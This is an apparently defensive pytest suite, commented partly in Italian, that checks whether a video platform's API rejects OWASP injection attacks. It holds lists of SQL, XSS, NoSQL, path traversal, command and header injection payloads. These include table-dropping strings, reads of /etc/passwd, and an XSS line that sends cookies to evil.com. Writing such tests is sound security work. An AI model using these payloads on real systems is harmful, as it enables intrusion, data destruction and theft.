"""
================================================================================
AI_MODULE: TestInjection
AI_VERSION: 1.0.0
AI_DESCRIPTION: Test SQL/NoSQL Injection su API REALI - OWASP A03:2021
AI_BUSINESS: Previene data breach e compromissione database
AI_TEACHING: SQLAlchemy parametrized queries, Pydantic sanitization

ZERO_MOCK_POLICY:
- Tutti i test chiamano backend REALE su localhost:8000
- Nessuna simulazione - test FALLISCONO se backend spento
- Verifica che payload malevoli NON funzionino

COVERAGE_TARGET: 100% endpoint con user input
================================================================================
"""

import pytest
from typing import List, Dict, Any


# ==============================================================================
# MARKERS
# ==============================================================================
pytestmark = [pytest.mark.security, pytest.mark.owasp]


# ==============================================================================
# SQL INJECTION PAYLOADS
# ==============================================================================
SQL_INJECTION_PAYLOADS = [
    # Classic SQL injection
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "'; DROP TABLE users; --",
    "'; DROP TABLE videos; --",
    "1; SELECT * FROM users",
    "1'; SELECT * FROM users WHERE '1'='1",

    # UNION-based injection
    "' UNION SELECT * FROM users --",
    "' UNION SELECT id, email, hashed_password FROM users --",
    "' UNION ALL SELECT NULL, NULL, NULL --",
    "1 UNION SELECT 1,2,3,4,5,6,7,8,9,10 --",

    # Blind SQL injection
    "' AND 1=1 --",
    "' AND 1=2 --",
    "' AND SLEEP(5) --",
    "'; WAITFOR DELAY '0:0:5' --",

    # PostgreSQL specific
    "'; SELECT pg_sleep(5); --",
    "' || pg_sleep(5) --",
    "$$; DROP TABLE users; $$",

    # Error-based injection
    "' AND extractvalue(1, concat(0x7e, version())) --",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",

    # Stacked queries
    "'; INSERT INTO users (email) VALUES ('hacker@evil.com'); --",
    "'; UPDATE users SET is_admin=true WHERE email='test@example.com'; --",
    "'; DELETE FROM users; --",

    # Comment-based bypass
    "admin'--",
    "admin'#",
    "admin'/*",

    # Hex encoding
    "0x27204f5220273127273d2731",

    # URL encoding (decoded by server)
    "%27%20OR%20%271%27%3D%271",
]


# ==============================================================================
# XSS PAYLOADS
# ==============================================================================
XSS_PAYLOADS = [
    # Basic script injection
    "<script>alert('XSS')</script>",
    "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",

    # Event handlers
    '<img src="x" onerror="alert(1)">',
    '<body onload="alert(1)">',
    '<svg onload="alert(1)">',
    '<div onmouseover="alert(1)">hover me</div>',

    # Protocol handlers
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',

    # Encoded XSS
    '&#60;script&#62;alert(1)&#60;/script&#62;',
    '%3Cscript%3Ealert(1)%3C/script%3E',

    # DOM-based XSS
    '<img src=1 href=1 onerror="javascript:alert(1)">',

    # SVG XSS
    '<svg><script>alert(1)</script></svg>',

    # Template injection
    '{{constructor.constructor("alert(1)")()}}',
    '${alert(1)}',
]


# ==============================================================================
# NOSQL INJECTION PAYLOADS
# ==============================================================================
NOSQL_INJECTION_PAYLOADS = [
    # MongoDB-style injection
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$where": "sleep(5000)"}',
    '{"$regex": ".*"}',

    # JSON injection
    '{"email": {"$ne": ""}}',
    '{"password": {"$exists": true}}',
]


# ==============================================================================
# TEST: SQL Injection - Auth Endpoints
# ==============================================================================
class TestSQLInjectionAuth:
    """Test SQL Injection su endpoint autenticazione."""

    @pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS[:10])  # Top 10 più comuni
    def test_login_email_injection(self, api_client, payload):
        """
        Login NON vulnerabile a SQL injection nel campo email.
        OWASP: A03:2021 - Injection
        """
        response = api_client.post("/api/v1/auth/login", json={
            "email": payload,
            "password": "password123"
        })

        # NON deve essere 200 con payload malevoli
        assert response.status_code in (400, 401, 422), f"Unexpected 200 with payload: {payload}"

        # NON deve esporre errori SQL nel response
        response_text = response.text.lower()
        assert "syntax error" not in response_text, f"SQL syntax exposed with: {payload}"
        assert "postgresql" not in response_text, f"DB type exposed with: {payload}"
        assert "pg_" not in response_text, f"PG internal exposed with: {payload}"
        assert "sqlalchemy" not in response_text, f"ORM exposed with: {payload}"

    @pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS[:10])
    def test_login_password_injection(self, api_client, payload):
        """Login NON vulnerabile a SQL injection nel campo password."""
        response = api_client.post("/api/v1/auth/login", json={
            "email": "test@example.com",
            "password": payload
        })

        # Should fail authentication, not expose SQL errors
        assert response.status_code in (400, 401, 422)
        assert "syntax" not in response.text.lower()
        assert "postgresql" not in response.text.lower()

    @pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS[:10])
    def test_register_email_injection(self, api_client, payload):
        """Register NON vulnerabile a SQL injection."""
        response = api_client.post("/api/v1/auth/register", json={
            "email": payload,
            "username": "testuser",
            "password": "ValidPass123!",
            "full_name": "Test User"
        })

        # Should reject invalid email, not expose SQL
        assert response.status_code in (400, 422)
        assert "syntax" not in response.text.lower()

    @pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS[:10])
    def test_register_username_injection(self, api_client, payload):
        """Register username NON vulnerabile."""
        response = api_client.post("/api/v1/auth/register", json={
            "email": "valid@example.com",
            "username": payload,
            "password": "ValidPass123!",
            "full_name": "Test User"
        })

        # Should reject invalid username
        assert response.status_code in (400, 422)


# ==============================================================================
# TEST: SQL Injection - Video Endpoints
# ==============================================================================
class TestSQLInjectionVideos:
    """Test SQL Injection su endpoint video."""

    @pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS[:5])
    def test_video_search_injection(self, api_client, auth_headers, payload):
        """Search video NON vulnerabile a SQL injection."""
        response = api_client.get(
            f"/api/v1/videos/search?q={payload}",
            headers=auth_headers
        )

        # Should either return empty results or 400, not SQL errors
        assert response.status_code in (200, 400, 422)
        if response.status_code == 200:
            # If 200, should return empty or filtered results
            assert "syntax" not in response.text.lower()
            assert "postgresql" not in response.text.lower()

    @pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS[:5])
    def test_video_filter_category_injection(self, api_client, auth_headers, payload):
        """Filter per categoria NON vulnerabile."""
        response = api_client.get(
            f"/api/v1/videos?category={payload}",
            headers=auth_headers
        )

        # Should reject invalid category enum
        assert response.status_code in (200, 400, 422)
        assert "syntax" not in response.text.lower()


# ==============================================================================
# TEST: SQL Injection - User Endpoints
# ==============================================================================
class TestSQLInjectionUsers:
    """Test SQL Injection su endpoint utenti."""

    @pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS[:5])
    def test_user_profile_update_injection(self, api_client, auth_headers, payload):
        """Profile update NON vulnerabile."""
        response = api_client.patch(
            "/api/v1/users/me",
            headers=auth_headers,
            json={"full_name": payload}
        )

        # Should either succeed (sanitized) or reject
        assert response.status_code in (200, 400, 422)
        assert "syntax" not in response.text.lower()


# ==============================================================================
# TEST: XSS Prevention
# ==============================================================================
class TestXSSPrevention:
    """Test XSS prevention - stored XSS."""

    @pytest.mark.parametrize("payload", XSS_PAYLOADS[:5])
    def test_xss_in_username(self, api_client, payload):
        """Username NON permette XSS."""
        import uuid
        unique_email = f"xss_test_{uuid.uuid4().hex[:8]}@example.com"

        response = api_client.post("/api/v1/auth/register", json={
            "email": unique_email,
            "username": payload[:50],  # Limit to max length
            "password": "ValidPass123!",
            "full_name": "XSS Test"
        })

        # Should reject XSS characters in username
        if response.status_code == 200:
            # If accepted, verify it's escaped/sanitized in response
            data = response.json()
            if "user" in data:
                assert "<script>" not in str(data)
                assert "onerror" not in str(data).lower()

    @pytest.mark.parametrize("payload", XSS_PAYLOADS[:5])
    def test_xss_in_full_name(self, api_client, auth_headers, payload):
        """Full name NON permette XSS execution."""
        response = api_client.patch(
            "/api/v1/users/me",
            headers=auth_headers,
            json={"full_name": payload}
        )

        # XSS should be escaped or rejected
        if response.status_code == 200:
            data = response.json()
            # Verify no raw script tags in response
            response_str = str(data)
            assert "<script>" not in response_str or "\\u003c" in response_str or "&lt;" in response_str


# ==============================================================================
# TEST: NoSQL Injection
# ==============================================================================
class TestNoSQLInjection:
    """Test NoSQL injection prevention."""

    @pytest.mark.parametrize("payload", NOSQL_INJECTION_PAYLOADS)
    def test_nosql_injection_login(self, api_client, payload):
        """Login NON vulnerabile a NoSQL injection."""
        # Try to inject NoSQL operators
        response = api_client.post("/api/v1/auth/login", json={
            "email": payload,
            "password": payload
        })

        # Should reject - PostgreSQL doesn't understand MongoDB operators
        assert response.status_code in (400, 401, 422)


# ==============================================================================
# TEST: Path Traversal
# ==============================================================================
class TestPathTraversal:
    """Test path traversal attacks."""

    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc/passwd",
        "/etc/passwd%00.jpg",
    ]

    @pytest.mark.parametrize("payload", PATH_TRAVERSAL_PAYLOADS)
    def test_path_traversal_video_slug(self, api_client, auth_headers, payload):
        """Video slug NON permette path traversal."""
        response = api_client.get(
            f"/api/v1/videos/{payload}",
            headers=auth_headers
        )

        # Should return 404 or 400, not file contents
        assert response.status_code in (400, 404, 422)
        assert "root:" not in response.text  # Unix passwd file
        assert "Administrator" not in response.text  # Windows SAM


# ==============================================================================
# TEST: Command Injection
# ==============================================================================
class TestCommandInjection:
    """Test command injection prevention."""

    COMMAND_INJECTION_PAYLOADS = [
        "; ls -la",
        "| cat /etc/passwd",
        "& dir",
        "$(whoami)",
        "`id`",
        "\n/bin/sh -c 'whoami'",
    ]

    @pytest.mark.parametrize("payload", COMMAND_INJECTION_PAYLOADS)
    def test_command_injection_video_title(self, api_client, admin_headers, payload):
        """Video title NON permette command injection."""
        response = api_client.post(
            "/api/v1/videos/",
            headers=admin_headers,
            json={
                "title": payload,
                "category": "technique",
                "difficulty": "beginner",
                "video_url": "https://example.com/video.mp4",
                "duration": 120
            }
        )

        # Should either create video (sanitized) or reject
        if response.status_code in (200, 201):
            # If created, verify command wasn't executed
            data = response.json()
            assert "root:" not in str(data)  # /etc/passwd contents
            assert "uid=" not in str(data)  # id command output


# ==============================================================================
# TEST: Header Injection
# ==============================================================================
class TestHeaderInjection:
    """Test HTTP header injection prevention."""

    HEADER_INJECTION_PAYLOADS = [
        "value\r\nX-Injected: header",
        "value\nSet-Cookie: hacked=true",
        "value\r\n\r\n<html>injected</html>",
    ]

    @pytest.mark.parametrize("payload", HEADER_INJECTION_PAYLOADS)
    def test_header_injection_via_input(self, api_client, payload):
        """Input NON permette header injection."""
        response = api_client.post("/api/v1/auth/login", json={
            "email": payload,
            "password": "test"
        })

        # Should not have injected headers
        assert "X-Injected" not in str(response.headers)
        assert "hacked=true" not in str(response.headers)


# ==============================================================================
# TEST: Error Message Information Disclosure
# ==============================================================================
class TestErrorDisclosure:
    """Test che errori non espongano informazioni sensibili."""

    def test_login_wrong_password_no_user_enum(self, api_client):
        """Login con password errata NON rivela se email esiste."""
        # Test with definitely non-existent email
        response1 = api_client.post("/api/v1/auth/login", json={
            "email": "definitely_not_exists_12345@example.com",
            "password": "WrongPass123!"
        })

        # Test with common email pattern
        response2 = api_client.post("/api/v1/auth/login", json={
            "email": "admin@example.com",
            "password": "WrongPass123!"
        })

        # Both should return same error type (no user enumeration)
        assert response1.status_code == response2.status_code
        # Error messages should be similar (not reveal if email exists)
        # Note: Some apps intentionally return different messages, but it's a security risk

    def test_500_error_no_stack_trace(self, api_client):
        """500 errors NON espongono stack trace."""
        # Try to trigger internal error with malformed data
        response = api_client.post("/api/v1/auth/login", json={
            "email": None,
            "password": None
        })

        # Should not expose internal details
        assert "Traceback" not in response.text
        assert "File \"" not in response.text
        assert "line " not in response.text.lower() or response.status_code != 500
